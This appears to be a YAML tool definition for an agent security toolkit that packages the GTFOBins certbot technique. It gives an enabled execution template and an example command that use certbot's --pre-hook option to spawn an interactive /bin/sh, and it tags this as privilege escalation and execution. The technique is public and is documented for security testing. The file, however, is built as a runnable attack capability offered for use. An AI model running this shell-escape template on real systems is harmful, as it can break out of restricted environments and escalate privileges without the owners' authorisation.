---
id: security-tls-certbot
namespace: security:tls:certbot
name: certbot
description: Let's Encrypt certificate client, can spawn a shell via pre-hook or manual hooks.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 32
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: low
  disk_io: low
allowed-tools:
  - certbot
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via certbot pre-hook
    command: certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/certbot/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "certbot"
    commands:
      - "apt-get install -y certbot"
items:
  - PFX
services:
  - HTTP
---
